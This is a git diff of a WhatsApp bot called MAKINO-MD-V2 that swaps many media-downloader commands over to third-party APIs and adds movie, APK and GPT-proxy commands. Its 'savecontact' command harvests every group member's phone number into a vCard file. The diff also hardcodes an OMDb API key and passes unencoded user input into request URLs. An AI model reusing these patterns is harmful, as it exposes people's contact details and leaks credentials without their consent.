@@ -340,7 +340,7 @@ const v2features = () =>{
       return;
     }
 
-   m.reply(`\`\`\` Bot Detected!!\`\`\`\n\n_*@${m.sender.split("@")[0]}*_ kicked by Anti Not!`, { mentions: [m.sender] });
+   m.reply(`\`\`\` Bot Detected!!\`\`\`\n\n_*@${m.sender.split("@")[0]}*_ kicked by Anti Bot!`, { mentions: [m.sender] });
    Taira.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    m.deleteMsg(m.key);
     return;
@@ -414,7 +414,32 @@ const v2features = () =>{
     }
 
     //-----------------------------------------------------------------------------------------------------------------------------------//
+ 
+   async function TylorXMp3 (link) {
+try {
+Taira.sendMessage(m.chat, { react: { text: '⏯️', key: m.key }})
+let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${link}`)
+Taira.sendMessage(m.chat, {
+ audio: {url: kyuu.result.mp3}, 
+ mimetype: "audio/mpeg",
+ contextInfo: {
+        externalAdReply: {
+          title: '♱MAKINO-MD-V2♱♡⃤',
+          body: kyuu.result.title,
+          thumbnailUrl: kyuu.result.image,
+          sourceUrl: kyuu.result.url,
+          mediaType: 2,
+          showAdAttribution: true,
+          renderLargerThumbnail: false
+        }
+      }
+    }, { quoted: m });
 
+  } catch (error) {
+    console.error('Error fetching the song:', error);
+    await reply(`*Error fetching the song.* \n_Please try again later._`)
+  }
+}
 
     // //don't edit this part.
     const formatTime = (seconds) => {
@@ -708,7 +733,47 @@ const smallinput = budy.toLowerCase();
 
 
     switch (command) {
+case 'statusview': {                                                                                     
+	if (isBan) return reply(mess.banned)
+        if (isBanChat) return reply(mess.bangc);                                               
+       if (!isCreator) return reply(mess.botowner)
+      if(!args[0]) return reply(`${command} on/off`)
+      if(args[0] === "on") {
+        global.viewstatus = true
+        reply(`Successfully enabled Auto status viewer.`)
+      } else if(args[0] === "off") {
+        global.viewstatus = false
+        reply(`Successfully disabled Auto status Viewer.`) 
+      }  else reply(`type ${prefix}${command}to see available options.`)
+    }
+break;
 
+		    
+case 'anticall': {                                                                                     
+	if (isBan) return reply(mess.banned)
+        if (isBanChat) return reply(mess.bangc);                                               
+       if (!isCreator) return reply(mess.botowner)
+      if(!args[0]) return reply(`${command} on/off`)
+      if(args[0] === "on") {
+        global.anticall = true
+        reply(`Successfully enabled anticall.`)
+      } else if(args[0] === "off") {
+        global.anticall = false
+        reply(`Successfully disabled anticall.`) 
+      }  else reply(`type ${prefix}${command}to see available options.`)
+    }
+break;
+
+
+
+case 'clear': case 'clearchat': {
+	     if (!isCreator) return
+	     await Taira.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+             await reply('Chat Cleared.');
+	    }
+	break
+
+		    
 case 'addowner': {
 if (!isCreator) return reply(mess.botowner)
 if (!args[0]) return reply(`Use like ${prefix+command} 234708096xxx\nExample ${prefix+command} 234708096xxx`)
@@ -753,8 +818,8 @@ break
 
 case 'savecontact': case 'svcontact':{
 if (!m.isGroup) return reply(mess.grouponly)
-if (!isCreator) return reply(mess.botowner)
-let cmiggc = await Tairac.groupMetadata(m.chat)
+if (!isCreator) return
+let cmiggc = await Taira.groupMetadata(m.chat)
 let orgiggc = participants.map(a => a.id)
 vcard = ''
 noPort = 0
@@ -762,11 +827,11 @@ for (let a of cmiggc.participants) {
     vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
 }
 let nmfilect = './contacts.vcf'
-reply("Saving  '+cmiggc.participants.length+' participants contact")
+reply('Saving  ' + cmiggc.participants.length+' participants contact')
 require('fs').writeFileSync(nmfilect, vcard.trim())
 await sleep(2000)
 Taira.sendMessage(m.chat, {
-    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'MAKINO-MD-V2.vcf', caption: '\nDone saving.\nGroup Name: *'+cmiggc.subject+'*\nContacts: *'+cmiggc.participants.length+'*'
+    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'MAKINO-MD-V3.vcf', caption: '\nDone saving.\nGroup Name: *'+cmiggc.subject+'*\nContacts: *'+cmiggc.participants.length+'*'
 }, {ephemeralExpiration: 86400, quoted: m})
 require('fs').unlinkSync(nmfilect)
 }
@@ -1121,29 +1186,6 @@ case 'tovv': {
         break;
 
 
-      case 'autostatus': case 'stsview': {
-        if (isBan) return reply(mess.banned);
-        if (isBanChat) return reply(mess.bangc);
-        if (!isCreator) return reply(mess.botowner)
-        Taira.sendMessage(from, { react: { text: '❤', key: m.key } });
-        if (args.length === 0) {
-          // Display the current status of autostatus
-          return m.reply(`Auto-Status is currently ${global.statusseen ? 'enabled' : 'disabled'}.`);
-        } else if (args.length === 1 && (args[0] === 'on' || args[0] === 'off')) {
-          const status = args[0];
-          if (status === 'on') {
-            global.statusseen = true;
-            return m.reply('Auto-Status is now enabled.');
-          } else {
-            global.statusseen = false;
-            return m.reply('Auto-Status is now disabled.');
-          }
-        } else {
-          return m.reply(`Usage: ${global.prefa[0]}autostatus [on/off]`);
-        }
-	}
-        break;
-
 
       case 'ban': {
         if (isBan) return reply(mess.banned);
@@ -1338,18 +1380,45 @@ case 'tovv': {
       case 'film': case 'movie': case 'moviesearch':
         if (isBan) return reply(mess.banned);
         if (isBanChat) return reply(mess.bangc);
-        reply(mess.waiting)
         if (!q) return reply(`Please enter a Movie search term...\nExample: ${prefix}movie Spiderman`)
-        xfarrapi.Film(q)
-          .then(data => {
-            console.log(data)
-            let krl = `*Search Term:* ${q}\n\n`
-            for (let i of data) {
-              krl += (`${prefix}----------------------------------------------------------------------------\n\n\n*Movie Name:* ${i.judul}\n *Quality :* ${i.quality}\n *Type : ${i.type}*\n *Uploaded on :* ${i.upload}\n *Source URL :* ${i.link}\n\n\n`)
-            }
-            Taira.sendMessage(from, { image: { url: data[0].thumb }, caption: krl }, { quoted: fdocs })
-          });
-        break;
+        let msearch = await axios.get(
+          `http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`
+        );
+        let mv2 = "";
+        console.log(msearch.data);
+        mv2 +=
+          "♱MAKINO-MD-V2♱♡⃤\n\n" + " ``` MOVIE SEARCH```\n";
+        mv2 += "Title      : " + msearch.data.Title + "\n";
+        mv2 += "Year       : " + msearch.data.Year + "\n";
+        mv2 += "Rated      : " + msearch.data.Rated + "\n";
+        mv2 += "Released   : " + msearch.data.Released + "\n";
+        mv2 += "Runtime    : " + msearch.data.Runtime + "\n";
+        mv2 += "Genre      : " + msearch.data.Genre + "\n";
+        mv2 += "Director   : " + msearch.data.Director + "\n";
+        mv2 += "Writer     : " + msearch.data.Writer + "\n";
+        mv2 += "Actors     : " + msearch.data.Actors + "\n";
+        mv2 += "Plot       : " + msearch.data.Plot + "\n";
+        mv2 += "Language   : " + msearch.data.Language + "\n";
+        mv2 += "Country    : " + msearch.data.Country + "\n";
+        mv2 += "Awards     : " + msearch.data.Awards + "\n";
+        mv2 += "BoxOffice  : " + msearch.data.BoxOffice + "\n";
+        mv2 += "Production : " + msearch.data.Production + "\n";
+        mv2 += "imdbRating : " + msearch.data.imdbRating + "\n";
+        mv2 += "imdbVotes  : " + msearch.data.imdbVotes + "";
+        Taira.sendMessage(
+          m.chat,
+          {
+            image: {
+              url: msearch.data.Poster,
+            },
+            caption: mv2,
+          },
+          {
+            quoted: m,
+          }
+        );
+        break;  
+      
 
       case 'wallpaper':
       case 'animewallpaper':
@@ -1382,25 +1451,22 @@ case 'tovv': {
         break;
 
 
-      case 'wikimedia': case 'wikiimage': {
+case 'wikimedia': case 'wikiimage': {
         if (isBan) return reply(mess.banned);
         if (isBanChat) return reply(mess.bangc);
         if (!args.join(" ")) return reply("What picture are you looking for??")
         let { wikimedia } = require('./lib/scraper')
-        anu = await wikimedia(args)
-        hasil = anu[Math.floor(Math.random() * anu.length)]
-        let buttons = [
-          { buttonId: `${prefix}wikimedia ${args.join(" ")}`, buttonText: { displayText: 'Next Image' }, type: 1 }
-        ]
-        let buttonMessage = {
-          image: { url: hasil.image },
-          caption: `Title : ${hasil.title}\nSource : ${hasil.source}\nMedia Url : ${hasil.image}`,
-          footer: `♱MAKINO-MD-V2♱♡⃤`,
-          buttons: buttons,
-          headerType: 4
+          let anumedia = await wikimedia(text);
+          result = anumedia[Math.floor(Math.random() * anumedia.length)];
+          Taira.sendMessage(
+            m.chat,
+            {
+              caption: `♱MAKINO-MD-V2♱♡⃤\n\nTitle : ${result.title}\nSource : ${result.source}\nMedia Url : ${result.image}`,
+              image: { url: result.image },
+            },
+            { quoted: m }
+          );
         }
-        Taira.sendMessage(m.chat, buttonMessage, { quoted: m })
-      }
         break;
 
 
@@ -1442,21 +1508,20 @@ case 'tovv': {
 
       case 'chat':
       case 'gpt':
+      {
         if (isBan) return reply(mess.banned);
         if (isBanChat) return reply(mess.bangc);
-
-        if (!args[0]) {
-          return reply(`Please provide a message to chat with the AI chatbot. Example: ${prefix}chat How are you?`);
-        }
-        const message = encodeURIComponent(args.join(' '));
-        const gptapi = `https://api.maher-zubair.tech/ai/chatgpt3?q=${message}`;
-        try {
-          const response = await axios.get(gptapi);
-          const result = response.data.result;
-          reply(result);
-        } catch (error) {
-          console.error('Error fetching AI chatbot response:', error);
-          reply('An error occurred while fetching the AI chatbot response. Please try again later.');
+        if (!text) return reply(`Please provide a message to chat with the AI chatbot. Example: ${prefix}chat How are you?`);
+          let d = await fetchJson(
+            `https://bk9.fun/ai/gptt4?q=${text}`
+          );
+          if (!d.BK9) {
+            return reply(
+              "An error occurred while fetching the AI chatbot response. Please try again later."
+            );
+          } else {
+            reply(d.BK9);
+          }
         }
         break;
 
@@ -1468,7 +1533,7 @@ case 'tovv': {
         const randomEmoji = manyemojis[Math.floor(Math.random() * manyemojis.length)];
         Taira.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
         if (!q) return reply(`Please provide a query to generate an image. Example: ${prefix + command} Beautiful landscape`);
-        const apiUrl = `https://gurugpt.cyclic.app/dalle?prompt=${encodeURIComponent(q)}`;
+        const apiUrl = `https://widipe.com/dalle?text=${encodeURIComponent(q)}`;
         try {
           await Taira.sendMessage(m.chat, { image: { url: apiUrl } }, { quoted: m });
         } catch (error) {
@@ -3655,50 +3720,56 @@ case 'tovv': {
       case 'igdl':
       case 'instagram':
       case 'insta':
-      case 'igreels':
-
-        {
+      case 'igreels': {
           if (isBan) {
             return reply(mess.banned);
           }
-
           if (isBanChat) {
             return reply(mess.bangc);
           }
-
           // Send a reaction emoji
           Taira.sendMessage(from, { react: { text: "🪄", key: m.key } });
+ if (!text) return reply(`Please provide an Instagram video url!`)
+var anu = await fetchJson(`https://widipe.com/download/igdl?url=${q}`)
+var hassdl = anu.result[0].url
+await Taira.sendMessage(m.chat, {
+video: {
+url: hassdl,
+caption: '♱MAKINO-MD-V2♱♡⃤'
+}
+}, {
+quoted: m
+})
+}
+break;
 
-          // Check if a link is provided
-          if (!text) {
-            return reply(`Where is the link?\n\nExample: ${prefix + command} https://www.instagram.com/reel/Ctjt0srIQFg/?igshid=MzRlODBiNWFlZA==`);
-          }
-
-          try {
-            // Download the Instagram video
-            let instadownload = await instadl(text);
-
-            // Send the downloaded video as a reply to the command
-            await Taira.sendMessage(m.chat, { video: { url: instadownload.url[0].url }, caption: mess.jobdone }, { quoted: m });
-          } catch (error) {
-            console.error('Error while processing Instagram video:', error);
-            return reply('An error occurred while processing the Instagram video.');
-          }
-        }
-        break;
-
-      case 'ig': {
-        if (isBan) return reply(mess.banned);
-        if (isBanChat) return reply(mess.bangc);
-        if (args[0] === "mp4") {
-          Taira.sendMessage(from, { video: { url: args[1] }, caption: 'Here it is...', mimetype: 'video/mp4' }, { quoted: m })
-        } else if (args[0] === "jpg") {
-          Taira.sendMessage(from, { image: { url: args[1] }, caption: 'Here it is...' }, { quoted: m })
-        } else {
-          reply("Error! ")
+     case "apk":
+      case "apkdl":
+        {
+          if (!text) return reply("What apk do you wanna download?");
+        let kyuu = await fetchJson (`https://bk9.fun/search/apk?q=${text}`);
+        let tylor = await fetchJson (`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
+         await Taira.sendMessage(
+              m.chat,
+              {
+                document: { url: tylor.BK9.dllink },
+                fileName: tylor.BK9.name,
+                mimetype: "application/vnd.android.package-archive",
+                contextInfo: {
+        externalAdReply: {
+          title: `♱MAKINO-MD-V2♱♡⃤`,
+          body: `${tylor.BK9.name}`,
+          thumbnailUrl: `${tylor.BK9.icon}`,
+          sourceUrl: `${tylor.BK9.dllink}`,
+          mediaType: 2,
+          showAdAttribution: true,
+          renderLargerThumbnail: false
         }
       }
-        break;
+    }, { quoted: m });
+          }
+      break;
+
 
 
       case 'mp4': {
@@ -3709,12 +3780,12 @@ case 'tovv': {
           Taira.sendMessage(from, {
             video: { url: args[0] }, caption: "Succes!", contextInfo: {
               externalAdreply: {
-                title: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
+                title: `♱MAKINO-MD-V2♱♡⃤`,
                 body: `${global.OwnerName}`,
                 thumbnail: BotLogo,
                 mediaType: 2,
-                mediaUrl: `${global.website}`,
-                sourceUrl: `${global.website}`
+                mediaUrl: `https://chat.whatsapp.com/DOVRqF006VHHZhiSNwJRce`,
+                sourceUrl: `https://chat.whatsapp.com/DOVRqF006VHHZhiSNwJRce`
               }
             }
           }, { quoted: m })
@@ -3737,69 +3808,40 @@ case 'tovv': {
       }
         break;
 
-      case 'twitter': case 'ttdl': {
+         case 'twitter': case 'ttdl': {
   if (!q) return reply("Provide a Twitter url to continue.")
-  if (isBan) return reply(mess.banned);
+   if (isBan) return reply(mess.banned);
   if (isBanChat) return reply(mess.bangc);
   if (!text) return reply(`Please provide the link!\n\nExample: ${prefix}${command} https://x.com/InternetH0F/status/1826967781629182205`)
-  //if (!q.includes('x.com')) return reply(`Invalid twitter link provided,recheck!`)
-  if (!isUrl(args[0]) && !args[0].includes('x.com')) return reply(`Invalid twitter link provided,recheck!`)
-  const data = fg.twitter(q)
-  const reslt = data.HD
-  const trimmed = reslt.match(/.*\.mp4/)[0];
-  await Taira.sendMessage(m.chat, { video: { url: trimmed }}, { quoted: m})
-	}
+let ty = await fetchJson(`https://widipe.com/download/twtdl?url=${encodeURIComponent(q)}`)
+await Taira.sendMessage(m.chat, {
+video: {
+url: ty.result.url.hd,
+caption: '♱MAKINO-MD-V2♱♡⃤'
+}
+}, {
+quoted: m
+})
+}
+break;
+
 
       case 'fbdl': case 'fb': case 'facebook': case 'fbmp4': {
         if (isBan) return reply(mess.banned);
         if (isBanChat) return reply(mess.bangc);
         if (!text) return reply(`Please provide the link!\n\nExample: ${prefix}facebook https://www.facebook.com/groups/599913174599515/permalink/705467384044093/`)
-        if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(`Invalid link!`)
-        let bocil = require('@bochilteam/scraper')
-        bocil.facebookdlv2(`${text}`).then(async (data) => {
-          let txt = `「 _Facebook Downloader_ 」\n\n`
-          txt += `*Title :* ${data.title}\n`
-          txt += `*Quality :* ${data.result[0].quality}\n`
-          txt += `*Description:* ${data.description}\n`
-          txt += `*URL :* ${text}\n\n`
-          buf = await getBuffer(data.thumbnail)
-          Taira.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail: buf, caption: `${txt}` }, { quoted: m })
-          for (let i of data.result) {
-            Taira.sendMessage(m.chat, { video: { url: i.url }, jpegThumbnail: buf, caption: `*Quality :* ${i.quality}` }, { quoted: m })
-          }
-        }).catch((err) => {
-          reply(mess.error)
-        })
-      }
-        break;
+let tyf = await fetchJson(`https://widipe.com/download/fbdl?url=${encodeURIComponent(q)}`)
+await Taira.sendMessage(m.chat, {
+video: {
+url: tyf.result.Normal_video,
+caption: '♱MAKINO-MD-V2♱♡⃤'
+}
+}, {
+quoted: m
+})
+}
+break;
 
-      case 'tiktok': {
-        if (isBan) return reply(mess.banned);
-        if (isBanChat) return reply(mess.bangc);
-        if (!q) return reply('Please provide the link !')
-        reply(mess.wait)
-        if (!q.includes('tiktok')) return reply(`Invalid tiktok link!`)
-        const musim_rambutan = await TairaTiktok(`${q}`).catch(e => {
-          reply(mess.error)
-        })
-        console.log(musim_rambutan)
-        const Tairatiktokop = musim_rambutan.result.watermark
-        texttk = `_Please choose the button below_`
-        let buttons = [
-          { buttonId: `${prefix}ttnowm ${q}`, buttonText: { displayText: 'Watermark Free' }, type: 1 },
-          { buttonId: `${prefix}ttaud ${q}`, buttonText: { displayText: 'Audio ' }, type: 1 }
-        ]
-        let buttonMessage = {
-          video: { url: Tairatiktokop },
-          caption: texttk,
-          footer: `${BotName}`,
-          buttons: buttons,
-          headerType: 4,
-
-        }
-        Taira.sendMessage(from, buttonMessage, { quoted: m })
-      }
-        break;
 
       case 'yts': case 'ytsearch': {
         if (isBan) return reply(mess.banned);
@@ -3809,7 +3851,7 @@ case 'tovv': {
         if (!args.join(" ")) return reply(`Example : -yts Heat waves`)
         let yts = require("youtube-yts")
         let search = await yts(args.join(" "))
-        let teks = '```「 🐦Makino-md-v2 YTS 」```\n\n Search Term: ' + text + '\n\n'
+        let teks = '```「 ♱MAKINO-MD-V2♱♡⃤ YTS 」```\n\n Search Term: ' + text + '\n\n'
         let no = 1
         for (let i of search.all) {
           teks += `Result No : ${no++}\n\nTitle : ${i.title}\n\nViews : ${i.views}\n\nDuration : ${i.timestamp}\n\nUploaded : ${i.ago}\n\nAuthor : ${i.author.name}\n\nUrl : ${i.url}\n\n\n-----------------------------------------------------------------------------\n\n\n`
@@ -3818,42 +3860,133 @@ case 'tovv': {
       }
         break;
 
-      //-----------------------------------------------------------------------------------------------------------------------------------//
 
+case 'tiktok': 
+case 'tt': 
+case 'ttdl': {
+    if (isBan) return reply(mess.banned);
+    if (isBanChat) return reply(mess.bangc);
+    if (!q) return reply("Provide a tiktok video link")
+    Taira.sendMessage(from, { react: { text: "🍃", key: m.key } });
+    let apiUrl = `https://widipe.com/download/tiktokdl?url=${encodeURIComponent(q)}`;
+    const fetch = require('node-fetch');
+    let response = await fetch(apiUrl);
+    let jsonResponse = await response.json();
+    let videoUrl = jsonResponse.result.video;
+    Taira.sendMessage(from, { 
+        video: { url: videoUrl }, 
+        mimetype: "video/mp4", 
+        caption: '> *♱MAKINO-MD-V2♱♡⃤*' 
+    }, { quoted: m });
+    break;
+}
 
-      case 'play':
-      case 'song':
-      case 'music': {
+		    
+case 'video': {
         if (isBan) return reply(mess.banned);
         if (isBanChat) return reply(mess.bangc);
-        Taira.sendMessage(from, { react: { text: "🎵", key: m.key } });
-        const YT = require('./lib/ytdl-core');
-        const yts = require('youtube-yts');
-        const ffmpeg = require('fluent-ffmpeg');
-        let search = await yts(text);
-        let anu = search.videos[0];
-        const ytmp3play = await YT.mp3(anu.url);
-        let thumbnailUrl = anu.thumbnail;
-        await Taira.sendMessage(from, {
-          audio: fs.readFileSync(ytmp3play.path),
-          filename: anu.title + '.mp3',
-          mimetype: 'audio/mpeg',
-          contextInfo: {
-               mentionedJid: [m.sender],
-               externalAdReply: {
-               title: "↺ |◁   II   ▷|   ♡",
-               body: `Playing: ${anu.title}`,
-               thumbnailUrl: thumbnailUrl,
-               sourceUrl: "https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r",
-               mediaType: 1,
-               renderLargerThumbnail: true
-               }
+    if (!q) return reply("Provide a query")
+    Taira.sendMessage(from, { react: { text: "🍃", key: m.key } });
+    let yts = require("youtube-yts");
+    let search = await yts(text);
+    let anu = search.videos[0]; 
+    let apiUrl = `https://widipe.com/download/ytdl?url=${encodeURIComponent(anu.url)}`;
+    const fetch = require('node-fetch'); 
+    let response = await fetch(apiUrl);
+    let jsonResponse = await response.json();
+    let videoUrl = jsonResponse.result.mp4;
+    let videoTitle = jsonResponse.result.title;
+    Taira.sendMessage(from, { 
+        video: { url: videoUrl }, 
+        mimetype: "video/mp4", 
+        caption: videoTitle + `\n> *♱MAKINO-MD-V2♱♡⃤*`
+    }, { quoted: m });
+    
+    break;
+}
+
+case 'ytmp3':
+{
+      if (isBan) return reply(mess.banned);
+      if (isBanChat) return reply(mess.bangc);
+	if (!text) return reply('Please provide a valid  YouTube link!');
+	let urls = text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
+	if (!urls) return reply('Seems like your message does not contain a valid YouTube link');
+	let urlIndex = parseInt(text) - 1;
+	if (urlIndex < 0 || urlIndex >= urls.length)
+		return reply('Invalid URL index');
+	await TylorXMp3(urls);
+}
+break;
+
+case 'ytdl': case 'ytmp4': {
+      if (isBan) return reply(mess.banned);
+      if (isBanChat) return reply(mess.bangc);
+    Taira.sendMessage(from, { react: { text: "🍃", key: m.key } });
+    let apiUrl = `https://widipe.com/download/ytdl?url=${encodeURIComponent(q)}`;
+    const fetch = require('node-fetch'); 
+    let response = await fetch(apiUrl);
+    let jsonResponse = await response.json();
+    let videoUrl = jsonResponse.result.mp4;
+    let videoTitle = jsonResponse.result.title;
+    Taira.sendMessage(from, { 
+        video: { url: videoUrl }, 
+        mimetype: "video/mp4", 
+        caption: videoTitle + `\n> *♱MAKINO-MD-V2♱♡⃤*`
+    }, { quoted: m });
+    
+    break;
+    }
+
+	
+   case 'play': case 'song': {
+      if (isBan) return reply(mess.banned);
+      if (isBanChat) return reply(mess.bangc);
+    if (!text) return reply(`Example : ${prefix + command} Halsey Without me`);
+    const yts = require("youtube-yts");
+    let search = await yts(text);
+    let anup3k = search.videos[0];
+    if (!anup3k) return reply("Song not found,,try another .....!");
+    const apiUrl = `https://widipe.com/download/ytdl?url=${encodeURIComponent(anup3k.url)}`;
+    let audioResponse;
+    try {
+        audioResponse = await axios.get(apiUrl);
+    } catch (error) {
+        console.error("Error fetching audio:", error);
+        return reply("Failed to download the audio. Please try again.");
+    }
+    if (!audioResponse.data.status) {
+        return reply("Failed to retrieve audio URL. Please try again.");
+    }
+    const mp3Url = audioResponse.data.result.mp3;
+    // Download the MP3 file
+    let mp3Buffer;
+    try {
+        const mp3DownloadResponse = await axios.get(mp3Url, { responseType: 'arraybuffer' });
+        mp3Buffer = Buffer.from(mp3DownloadResponse.data);
+    } catch (error) {
+        console.error("Error downloading MP3:", error);
+        return reply("Failed to download the MP3. Please try again.");
+    }
+    await Taira.sendMessage(m.chat, {
+        audio: mp3Buffer,
+        fileName: anup3k.title + '.mp3',
+        mimetype: 'audio/mp4',
+        ptt: true,
+        contextInfo: {
+            externalAdReply: {
+                title: anup3k.title,
+                body: "♱MAKINO-MD-V2♱♡⃤",
+                thumbnail: await fetchBuffer(anup3k.thumbnail), // Use thumbnail from the search result
+                mediaType: 2,
+                mediaUrl: anup3k.url,
             }
-         },
-          { quoted: m },
-        );
-      }
-        break;
+        },
+    }, { quoted: m });
+}
+break
+      //-----------------------------------------------------------------------------------------------------------------------------------//
+
 
       case 'spotify': {
         if (isBan) return reply(mess.banned);
@@ -3890,79 +4023,52 @@ case 'tovv': {
       }
         break;
 
-
-      case 'ytvd': case 'video': case 'ytvideo': case 'ytmp4': {
+        case 'lyrics':
+        {
         if (isBan) return reply(mess.banned);
         if (isBanChat) return reply(mess.bangc);
-        Taira.sendMessage(from, { react: { text: "🍃", key: m.key } })
-        const YT = require('./lib/ytdl-core')
-        let yts = require("youtube-yts")
-        let search = await yts(text)
-        let anu = search.videos[0]
-        const ytmp4play = await YT.mp4(anu.url)
-        Taira.sendMessage(from, { video: { url: ytmp4play.videoUrl }, mimetype: "video/mp4", caption: anu.title + ' By *Taira MD*', }, { quoted: m })
-      }
-
-        break;
-
-		    
-
-      case 'ytmp3': {
-        if (isBan) return reply(mess.banned);
-        if (isBanChat) return reply(mess.bangc);
-        Taira.sendMessage(from, { react: { text: "⌛", key: m.key } })
-
-        const YT = require('./lib/ytdl-core')
-        const ytmp3play2 = await YT.mp3(text)
-
-        await Taira.sendMessage(from, { document: fs.readFileSync(ytmp3play2.path), fileName: 'Taira_YTmp3_Downloader.mp3', mimetype: 'audio/mpeg', }, { quoted: m })
-      }
-        break;
-
-
-      case 'ytvd2': case 'ytmp4': {
-        if (isBan) return reply(mess.banned);
-        if (isBanChat) return reply(mess.bangc);
-        Taira.sendMessage(from, { react: { text: "🍁", key: m.key } })
-        const YT = require('./lib/ytdl-core')
-        const ytmp4play2 = await YT.mp4(text)
-        Taira.sendMessage(from, { video: { url: ytmp4play2.videoUrl }, mimetype: "video/mp4", caption: 'Downloaded by *Taira MD*', }, { quoted: m })
-      }
-        break;
-
-
-      case 'lyrics':
-        if (isBan) return reply(mess.banned);
-        if (isBanChat) return reply(mess.bangc);
-        if (!m.isGroup) return reply(mess.grouponly);
         Taira.sendMessage(from, { react: { text: "🍁", key: m.key } });
-
-        if (!text) return reply(`Command usage: ${prefix}lyrics <song title>`);
-
-        reply(mess.waiting);
-
-        const { getLyrics } = require("@fantox01/lyrics-scraper");
-
-        try {
-          const data = await getLyrics(text);
-
-          const message = `
-        *♱MAKINO-MD-V2♱♡⃤ lyrics*
-        *Title:* ${text}
-        *Artist:* ${data.artist}
-        *Album:* ${data.album}
-        *Release Date:* ${data.release_date}
-        
-        *Lyrics:*\n${data.lyrics}
-            `.trim();
-
-          Taira.sendMessage(from, { text: message, quoted: m });
-        } catch (error) {
-          console.error('Error fetching lyrics:', error);
-          const errorMessage = 'Failed to fetch lyrics. Please try again later.';
-          Taira.sendMessage(from, { text: errorMessage, quoted: m });
+          if (!text)
+            return reply(
+              `What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`
+            );
+          let lyric = await fetch(
+            `https://widipe.com/lirik?text=${text}`
+          );
+          let jsonxeon = await lyric.json();
+          if (jsonxeon.result.error) {
+            reply("Lyrics not found.");
+          } else {
+            reply(
+              `
+*♱MAKINO-MD-V2♱♡⃤*
+*Artist*: ${jsonxeon.result.artist}\n\n*Lyrics*:\n${jsonxeon.result.lyrics}`
+            );
+          }
         }
         break;
+
+
+	case 'runtime': case 'uptime': {
+                let pinga = `Faster Than Your Girlfriend 💦`
+                Taira.sendMessage(m.chat, {
+                    text: pinga,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: true,
+                            title: `Uptime/Runtime ${runtime(process.uptime())}`,
+                            body: `ταιяα мακιиο`,
+                            thumbnailUrl: 'https://telegra.ph/file/5b7e44e2f5660aa2c4cad.jpg',
+                            sourceUrl: 'https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r',
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                })
+	}
+                break 
 
 
 
@@ -3998,16 +4104,9 @@ case 'tovv': {
         if (isBan) return reply(mess.banned);
         if (isBanChat) return reply(mess.bangc);
         Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
-
-        /*     let buttons = [
-                     {buttonId: `${prefix}coffee`, buttonText: {displayText: '>>'}, type: 1}
-                 ]  */
         let buttonMessage = {
           image: { url: 'https://coffee.alexflipnote.dev/random' },
           caption: `Here is your Coffee...`,
-          /*   footer: `${BotName}`,
-             buttons: buttons,
-             headerType: 4  */
         }
         Taira.sendMessage(m.chat, buttonMessage, { quoted: m })
       }
@@ -4092,30 +4191,26 @@ case 'tovv': {
         mee = await Taira.downloadAndSaveMediaMessage(quoted)
         mem = await TelegraPh(mee)
         meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
-        memek = await Taira.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
+        memek = await Taira.sendImageAsSticker(m.chat, meme, m, { packname: '♱MAKINO-MD-V2♱♡⃤', author: global.author })
         await fs.unlinkSync(memek)
       }
         break;
 
-
-      case 'sgif': case 'sticker': case 's': {
-        if (isBan) return reply(mess.banned);
-        if (isBanChat) return reply(mess.bangc);
-        Taira.sendMessage(from, { react: { text: "🌝", key: m.key } })
-        if (/image/.test(mime)) {
-          let media = await quoted.download()
-          let encmedia = await Taira.sendImageAsSticker(m.chat, media, m, { packname: '🐦Makino-md-v2', author: global.author })
-          await fs.unlinkSync(encmedia)
-        } else if (/video/.test(mime)) {
-          if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
-          let media = await quoted.download()
-          let encmedia = await Taira.sendVideoAsSticker(m.chat, media, m, { packname: '🐦Makino-md-v2', author: global.author })
-          await fs.unlinkSync(encmedia)
-        } else {
-          reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
-        }
-      }
-        break;
+            
+case 's': case 'sticker': {
+if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
+if (/image/.test(mime)) {
+let media = await quoted.download()
+let encmedia = await Taira.sendImageAsSticker(m.chat, media, m, { packname: '♱MAKINO-MD-V2♱♡⃤', author: global.author })
+} else if (/video/.test(mime)) {
+if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
+let media = await quoted.download()
+let encmedia = await Taira.sendVideoAsSticker(m.chat, media, m, { packname: '♱MAKINO-MD-V2♱♡⃤', author: global.author })
+} else {
+reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
+}
+}
+break
 
 
 
@@ -4812,9 +4907,6 @@ case 'tovv': {
         if (!m.isGroup) return reply(mess.grouponly);
         reply(mess.waiting)
         ud = await axios.get('https://waifu.pics/api/sfw/megumin')
-        /*var wbutsss = [
